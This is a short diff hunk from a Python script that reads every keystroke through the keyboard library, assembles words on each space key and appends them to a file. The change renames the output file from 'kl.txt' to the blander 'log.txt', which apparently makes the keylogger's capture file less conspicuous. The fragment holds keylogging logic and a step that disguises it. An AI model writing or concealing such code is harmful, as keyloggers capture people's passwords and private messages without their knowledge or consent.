@@ -15,7 +15,7 @@ def main():
     word_list = []
     word_list.append('')
     index = 0
-    f = open('./kl.txt', 'a')
+    f = open('./log.txt', 'a')
     while True:
         event = keyboard.read_event()
         if event.event_type == keyboard.KEY_DOWN and event.name == 'space':
